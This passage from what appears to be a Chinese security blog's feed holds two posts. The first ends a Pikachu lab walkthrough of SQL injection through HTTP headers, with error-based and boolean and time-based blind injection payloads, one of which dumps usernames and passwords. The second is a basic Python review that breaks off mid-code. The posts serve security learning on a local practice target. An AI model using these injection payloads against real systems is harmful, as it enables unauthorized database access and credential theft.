class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/pikachu/vul/sqli/sqli_header/sqli_header_login.php<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; Idea-c3372850=66e26605-e73d-4e3c-aa9a-17c04f537994; PHPSESSID=4ar35f3bvvcbi8io62reop6865<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br></code></pre></td></tr></table></figure><p><strong>常见的http头部注入：UA头注入、Referer注入、Cookie注入</strong></p><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>User-Agent</td><td>HTTP 客户端程序的信息</td></tr><tr><td>Referer</td><td>对请求中 URI 的原始获取方</td></tr><tr><td>Cookie</td><td>存储数据<br />（例如：使无状态的HTTP协议变成有状态的session连接、登录权限）</td></tr></tbody></table><h3 id="1-UA头注入"><a href="#1-UA头注入" class="headerlink" title="1.UA头注入"></a>1.UA头注入</h3><p>也就是User-Agent处注入。</p><p>先进行<code>&#39;</code>测试。</p><p>回显：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">You have an error <span class="hljs-keyword">in</span> your <span class="hljs-keyword">SQL</span> syntax; <span class="hljs-keyword">check</span> the manual that corresponds <span class="hljs-keyword">to</span> your MySQL server version <span class="hljs-keyword">for</span> the <span class="hljs-keyword">right</span> syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;&#x27;</span> <span class="hljs-keyword">at</span> line <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>直接输入1回显正常。</p><p>多次测试后，猜测有insert行为，可以使用报错注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- payload</span><br><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,database()),1) and &#x27;</span><br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328171330234.png" alt="image-20230328171330234" style="zoom:33%;" /><p>成功回显数据库.</p><p>其他几种报错注入的测试：</p><ul><li>floor()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 版本</span><br><span class="hljs-string">&#x27;or (select 1 from (select count(*),concat((select version()),floor(rand(0)*2))x from information_schema.tables group by x)a) or&#x27;</span><br><br><span class="hljs-comment">-- 回显用户名密码</span><br><span class="hljs-string">&#x27;or (select 1 from (select count(*),concat((select group_concat(username,0x3a,password) from users),floor(rand(0)*2))x from information_schema.tables group by x)a) or&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>extravalue()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#x27;</span><br></code></pre></td></tr></table></figure><h3 id="2-Cookie注入"><a href="#2-Cookie注入" class="headerlink" title="2.Cookie注入"></a>2.Cookie注入</h3><p>一样的报错注入。</p><p>payload：<code>&#39; and updatexml(1,concat(0x7e,database()),0)#</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>ant[uname]=admin&#x27; and updatexml(1,concat(0x7e,database()),0)#; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; Idea-c3372850=66e26605-e73d-4e3c-aa9a-17c04f537994; PHPSESSID=4ar35f3bvvcbi8io62reop6865<br></code></pre></td></tr></table></figure><h2 id="8-盲注（基于boolean）"><a href="#8-盲注（基于boolean）" class="headerlink" title="8.盲注（基于boolean）"></a>8.盲注（基于boolean）</h2><p>当后台使用了一些方法，使回显不出现我们想要的信息，此时进行注入叫做盲注。</p><p><strong>有三种常见的盲注方法：布尔盲注、时间盲注、运行错误盲注</strong></p><p>由于手工注入十分麻烦，建议使用工具。</p><p>常用函数：</p><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>length()</td><td>返回字符串的长度</td></tr><tr><td>substr()</td><td>用来截取字符串</td></tr><tr><td>sleep()</td><td>用来制造延时用来截取字符串</td></tr><tr><td>if(ex1,ex2,ex3)</td><td>判断语句，ex1正确执行ex2，错误执行ex3</td></tr></tbody></table><p>对该题目进行测试：</p><p>输入正确的用户名，回显正确uid和email。</p><p>输入错误的用户名，回显“您输入的username不存在，请重新输入！”</p><p>输入正确用户名+<code>&#39; and 1=1#</code>，回显正确uid和email。</p><p>输入正确用户名+<code>&#39; and 1=2#</code>，回显“您输入的username不存在，请重新输入！”。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328182334135.png" alt="image-20230328182334135" style="zoom:33%;" /><p>说明内部会进行判断，且有注入漏洞存在。</p><p>输入payload进行测试，先测试<strong>数据库的长度</strong>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- test1为已经存在的用户</span><br>test1<span class="hljs-string">&#x27; and length(database())&gt;=1#   回显正常</span><br><span class="hljs-string">test1&#x27;</span> <span class="hljs-keyword">and</span> length(database())<span class="hljs-operator">&gt;=</span><span class="hljs-number">7</span>#   回显正常<br>test1<span class="hljs-string">&#x27; and length(database())&gt;=8#   回显错误</span><br></code></pre></td></tr></table></figure><p>这也就意味着数据库的长度为7.</p><p>下一步来判断数据库的具体名字，使用substr和ascii判断。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">test1<span class="hljs-string">&#x27; and ascii(substr(database(), 1, 1)) &gt; 105#   回显正常</span><br><span class="hljs-string">test1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)) <span class="hljs-operator">&gt;</span> <span class="hljs-number">120</span>#   回显错误<br>test1<span class="hljs-string">&#x27; and ascii(substr(database(), 1, 1)) = 112#   回显正常</span><br></code></pre></td></tr></table></figure><p>112也就是p。</p><p>也可以直接跑，结果也是p。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328184536047.png" alt="image-20230328184536047"></p><p>设置两个注入点，就可以一次跑出来数据库的名字。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328185224224.png" alt="image-20230328185224224" style="zoom:50%;" /><p>1:112、2:105、3:107、4:97、5:99、6:104、7:117</p><p>p、i、k、a、c、h、u。</p><h2 id="9-盲注（基于time）"><a href="#9-盲注（基于time）" class="headerlink" title="9.盲注（基于time）"></a>9.盲注（基于time）</h2><p>通过if判断，正确休眠，错误查询。</p><p>例如payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">test1<span class="hljs-string">&#x27; and  if((substr(database(), 1, 1))=&#x27;</span>p<span class="hljs-string">&#x27;, sleep(5), null)#</span><br></code></pre></td></tr></table></figure><p>如果database的第一个字符为p就睡眠五秒，也可以设置少一点。</p><p>其他的和布尔盲注差别不大。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/weixin_52385170/article/details/128093840">https://blog.csdn.net/weixin_52385170/article/details/128093840</a></p><p><a href="https://www.freebuf.com/articles/web/256097.html">https://www.freebuf.com/articles/web/256097.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/398726175">https://zhuanlan.zhihu.com/p/398726175</a></p><p><a href="https://blog.csdn.net/qq_51789211/article/details/128677727">https://blog.csdn.net/qq_51789211/article/details/128677727</a></p><p><a href="https://www.freebuf.com/vuls/345056.html">https://www.freebuf.com/vuls/345056.html</a></p><p><a href="https://xz.aliyun.com/t/9849">https://xz.aliyun.com/t/9849</a></p><p><a href="http://imyhq.com/sec/1907.html">http://imyhq.com/sec/1907.html</a></p><p><a href="https://www.freebuf.com/articles/web/263555.html">https://www.freebuf.com/articles/web/263555.html</a></p><p>《图解http》</p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>知识点简单整合</title>
    <link href="/2023/03/24/2023/%E8%BF%87%E5%8E%BB%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AE%80%E5%8D%95%E6%95%B4%E5%90%88/"/>
    <url>/2023/03/24/2023/%E8%BF%87%E5%8E%BB%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AE%80%E5%8D%95%E6%95%B4%E5%90%88/</url>
    
    <content type="html"><![CDATA[<p>复习和整合一下以前学过的知识吧。</p><p>好多都忘得七七八八了。</p><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p><a href="https://github.com/jackfrued/Python-100-Days">python100day</a></p><p><strong>优点：简单、开源、免费、高级语言、解释型语言（跨平台）、面向对象编程、功能强大、扩展性强（胶水语言）</strong></p><p><strong>缺点：执行效率低，代码无法加密</strong></p><p>自带开发工具IDLE（用户体验不太好）</p><p>python之禅：import this</p><p>turtle画图：import turtle （原LOGO语言）</p><p>常见的数据类型：整型、浮点型、字符串型、布尔型、负数型</p><p><strong>变量命名规则</strong></p><ul><li>硬性规则：<ul><li>变量名由字母（广义的Unicode字符，不包括特殊字符）、数字和下划线构成，数字不能开头。</li><li>大小写敏感（大写的<code>a</code>和小写的<code>A</code>是两个不同的变量）。</li><li>不要跟关键字（有特殊含义的单词）和系统保留字（如函数、模块等的名字）冲突。</li></ul></li><li>PEP 8要求：<ul><li>用小写字母拼写，多个单词用下划线连接。</li><li>受保护的实例属性用单个下划线开头。</li><li>私有的实例属性用两个下划线开头。</li></ul></li></ul><p><strong>常用内置函数：</strong></p><ul><li><code>int()</code>：将一个数值或字符串转换成整数，可以指定进制。</li><li><code>float()</code>：将一个字符串转换成浮点数。</li><li><code>str()</code>：将指定的对象转换成字符串形式，可以指定编码。</li><li><code>chr()</code>：将整数转换成该编码对应的字符串（一个字符）。</li><li><code>ord()</code>：将字符串（一个字符）转换成对应的编码（整数）。</li></ul><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td><code>[]</code> <code>[:]</code></td><td>下标，切片</td></tr><tr><td><code>**</code></td><td>指数</td></tr><tr><td><code>~</code> <code>+</code> <code>-</code></td><td>按位取反, 正负号</td></tr><tr><td><code>*</code> <code>/</code> <code>%</code> <code>//</code></td><td>乘，除，模，整除</td></tr><tr><td><code>+</code> <code>-</code></td><td>加，减</td></tr><tr><td><code>&gt;&gt;</code> <code>&lt;&lt;</code></td><td>右移，左移</td></tr><tr><td><code>&amp;</code></td><td>按位与</td></tr><tr><td><code>^</code> &#96;</td><td>&#96;</td></tr><tr><td><code>&lt;=</code> <code>&lt;</code> <code>&gt;</code> <code>&gt;=</code></td><td>小于等于，小于，大于，大于等于</td></tr><tr><td><code>==</code> <code>!=</code></td><td>等于，不等于</td></tr><tr><td><code>is</code> <code>is not</code></td><td>身份运算符</td></tr><tr><td><code>in</code> <code>not in</code></td><td>成员运算符</td></tr><tr><td><code>not</code> <code>or</code> <code>and</code></td><td>逻辑运算符</td></tr><tr><td><code>=</code> <code>+=</code> <code>-=</code> <code>*=</code> <code>/=</code> <code>%=</code> <code>//=</code> <code>**=</code> <code>&amp;=</code> &#96;</td><td>&#x3D;<code> </code>^&#x3D;<code> </code>&gt;&gt;&#x3D;<code> </code>&lt;&lt;&#x3D;&#96;</td></tr></tbody></table><p>比较运算符的优先级高于赋值运算符。</p><p>python不像C或者java使用花括号来构造代码块，而是通过缩进判断代码层次。</p><p><strong>分支结构：</strong></p><ul><li>if、elif、else</li></ul><p><strong>循环结构：</strong></p><ul><li>for-in</li><li>while</li></ul><p><strong>斐波那契数列（前20）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#1 1 2 3 5 8 13 21 ...</span><br>a = <span class="hljs-number">0</span><br>b = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    a, b = b, a + b<br>    <span class="hljs-built_in">print</span>(a, end=<span class="hljs-string">&#x27; &#x27;</span>)<br></code></pre></td></tr></table></figure><p>定义函数：<strong>def</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># Todo: Add your code here</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>案例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">roll_dice</span>(<span class="hljs-params">n=<span class="hljs-number">2</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;摇色子&quot;&quot;&quot;</span><br>    total = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        total += randint(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>)<br>    <span class="hljs-keyword">return</span> total<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a=<span class="hljs-number">0</span>, b=<span class="hljs-number">0</span>, c=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;三个数相加&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> a + b + c<br><br><br><span class="hljs-comment"># 如果没有指定参数那么使用默认值摇两颗色子</span><br><span class="hljs-built_in">print</span>(roll_dice())<br><span class="hljs-comment"># 摇三颗色子</span><br><span class="hljs-built_in">print</span>(roll_dice(<span class="hljs-number">3</span>))<br><span class="hljs-built_in">print</span>(add())<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>))<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>))<br><span class="hljs-comment"># 传递参数时可以不按照设定的顺序进行传递</span><br><span class="hljs-built_in">print</span>(add(c=<span class="hljs-number">50</span>, a=<span class="hljs-number">100</span>, b=<span class="hljs-number">200</span>))<br><br><span class="hljs-comment">#################################################</span><br><br><span class="hljs-comment"># 在参数名前面的*表示args是一个可变参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">*args</span>):<br>    total = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> args:<br>        total += val<br>    <span class="hljs-keyword">return</span> total<br><br><span class="hljs-comment"># 在调用add函数时可以传入0个或多个参数</span><br><span class="hljs-built_in">print</span>(add())<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>))<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>))<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>))<br></code></pre></td></tr></table></figure><p>函数同名时，后面覆盖前面的。</p><p><strong>全局：global</strong></p><p>字符串：由零个或多个字符组成的有限序列，用单引号或双引号包围。</p><p>格式化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a, b = <span class="hljs-number">5</span>, <span class="hljs-number">10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%d * %d = %d&#x27;</span> % (a, b, a * b))<br><br><span class="hljs-comment">#字符串格式</span><br>a, b = <span class="hljs-number">5</span>, <span class="hljs-number">10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;0&#125; * &#123;1&#125; = &#123;2&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(a, b, a * b))<br><br><span class="hljs-comment">#python 3.6后的语法糖</span><br>a, b = <span class="hljs-number">5</span>, <span class="hljs-number">10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;a&#125;</span> * <span class="hljs-subst">&#123;b&#125;</span> = <span class="hljs-subst">&#123;a * b&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p>列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">list1 = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">100</span>]<br><span class="hljs-comment"># 添加元素</span><br>list1.append(<span class="hljs-number">200</span>)<br>list1.insert(<span class="hljs-number">1</span>, <span class="hljs-number">400</span>)<br><span class="hljs-comment"># 合并两个列表</span><br><span class="hljs-comment"># list1.extend([1000, 2000])</span><br>list1 += [<span class="hljs-number">1000</span>, <span class="hljs-number">2000</span>]<br><span class="hljs-built_in">print</span>(list1) <span class="hljs-comment"># [1, 400, 3, 5, 7, 100, 200, 1000, 2000]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(list1)) <span class="hljs-comment"># 9</span><br><span class="hljs-comment"># 先通过成员运算判断元素是否在列表中，如果存在就删除该元素</span><br><span class="hljs-keyword">if</span> <span class="hljs-number">3</span> <span class="hljs-keyword">in</span> list1:<br>list1.remove(<span class="hljs-number">3</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-number">1234</span> <span class="hljs-keyword">in</span> list1:<br>    list1.remove(<span class="hljs-number">1234</span>)<br><span class="hljs-built_in">print</span>(list1) <span class="hljs-comment"># [1, 400, 5, 7, 100, 200, 1000, 2000]</span><br><span class="hljs-comment"># 从指定的位置删除元素</span><br>list1.pop(<span class="hljs-number">0</span>)<br>list1.pop(<span class="hljs-built_in">len</span>(list1) - <span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(list1) <span class="hljs-comment"># [400, 5, 7, 100, 200, 1000]</span><br><span class="hljs-comment"># 清空列表元素</span><br>list1.clear()<br><span class="hljs-built_in">print</span>(list1) <span class="hljs-comment"># []</span><br></code></pre></td></tr></table></figure><p><strong>生成式和生成器：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">f = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)]<br><span class="hljs-comment">#[1, 2, 3, 4, 5, 6, 7, 8, 9]</span><br>f = [x + y <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ABCDE&#x27;</span> <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;1234567&#x27;</span>]<br><span class="hljs-comment">#[&#x27;A1&#x27;, &#x27;A2&#x27;, &#x27;A3&#x27;, &#x27;A4&#x27;, &#x27;A5&#x27;, &#x27;A6&#x27;, &#x27;A7&#x27;, &#x27;B1&#x27;, &#x27;B2&#x27;, &#x27;B3&#x27;, &#x27;B4&#x27;, &#x27;B5&#x27;, &#x27;B6&#x27;, &#x27;B7&#x27;, &#x27;C1&#x27;, &#x27;C2&#x27;, &#x27;C3&#x27;, &#x27;C4&#x27;, &#x27;C5&#x27;, &#x27;C6&#x27;, &#x27;C7&#x27;, &#x27;D1&#x27;, &#x27;D2&#x27;, &#x27;D3&#x27;, &#x27;D4&#x27;, &#x27;D5&#x27;, &#x27;D6&#x27;, &#x27;D7&#x27;, &#x27;E1&#x27;, &#x27;E2&#x27;, &#x27;E3&#x27;, &#x27;E4&#x27;, &#x27;E5&#x27;, &#x27;E6&#x27;, &#x27;E7&#x27;]</span><br><br><span class="hljs-comment"># 请注意下面的代码创建的不是一个列表而是一个生成器对象</span><br><span class="hljs-comment"># 通过生成器可以获取到数据但它不占用额外的空间存储数据</span><br><span class="hljs-comment"># 每次需要数据的时候就通过内部的运算得到数据(需要花费额外的时间)</span><br>f = (x ** <span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>))<br><span class="hljs-built_in">print</span>(sys.getsizeof(f))  <span class="hljs-comment"># 相比生成式生成器不占用存储数据的空间</span><br><span class="hljs-built_in">print</span>(f)<br><span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> f:<br>    <span class="hljs-built_in">print</span>(val)<br></code></pre></td></tr></table></figure><p>可用<a href="https://mp.weixin.qq.com/s?__biz=MzAxMjUyNDQ5OA==&mid=2653572316&idx=3&sn=b0cfb4f896bad5bdd301b4307f92246d&chksm=806e6261b719eb7714ea3bc7cd421b00076e99797c72981227c264f0682afd4c9e2ca2d4236f&scene=27">yield</a>关键字将普通函数改造成生成器函数（例：斐波那契）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fib</span>(<span class="hljs-params">n</span>):<br>    a, b = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        a, b = b, a + b<br>        <span class="hljs-keyword">yield</span> a<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> fib(<span class="hljs-number">20</span>):<br>        <span class="hljs-built_in">print</span>(val)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>元组：元组与列表类似也是一种容器数据类型，可以用一个变量（对象）来存储多个数据，不同之处在于元组的元素不能修改</p><p><strong>集合</strong>：集合跟数学上的集合是一致的，不允许有重复元素，而且可以进行交集、并集、差集等运算。</p><p><img src="https://github.com/jackfrued/Python-100-Days/raw/master/Day01-15/res/python-set.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建集合的字面量语法</span><br>set1 = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>&#125;<br><span class="hljs-built_in">print</span>(set1) <span class="hljs-comment">#&#123;1,2,3&#125;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Length =&#x27;</span>, <span class="hljs-built_in">len</span>(set1)) <span class="hljs-comment"># 3</span><br><span class="hljs-comment"># 创建集合的构造器语法(面向对象部分会进行详细讲解)</span><br>set2 = <span class="hljs-built_in">set</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>))<br>set3 = <span class="hljs-built_in">set</span>((<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(set2, set3) <span class="hljs-comment">#&#123;1, 2, 3, 4, 5, 6, 7, 8, 9&#125; &#123;1, 2, 3&#125;</span><br><span class="hljs-comment"># 创建集合的推导式语法(推导式也可以用于推导集合)</span><br>set4 = &#123;num <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>) <span class="hljs-keyword">if</span> num % <span class="hljs-number">3</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> num % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>&#125;<br><span class="hljs-built_in">print</span>(set4)<br><span class="hljs-comment">#&#123;3, 5, 6, 9, 10, 12, 15, 18, 20, 21, 24, 25, 27, 30, 33, 35, 36, 39, 40, 42, 45, 48, 50, 51, 54, 55, 57, 60, 63, 65, 66, 69, 70, 72, 75, 78, 80, 81, 84, 85, 87, 90, 93, 95, 96, 99&#125;</span><br></code></pre></td></tr></table></figure><p>字典：可以存储任意类型对象，与列表、集合不同的是，字典的每个元素都是由一个键和一个值组成的“键值对”，键和值通过冒号分开。</p><p>定义类：class</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br>    <span class="hljs-comment"># __init__是一个特殊方法用于在创建对象时进行初始化操作</span><br>    <span class="hljs-comment"># 通过这个方法我们可以为学生对象绑定name和age两个属性</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br><br>    <span class="hljs-keyword">def</span> <span 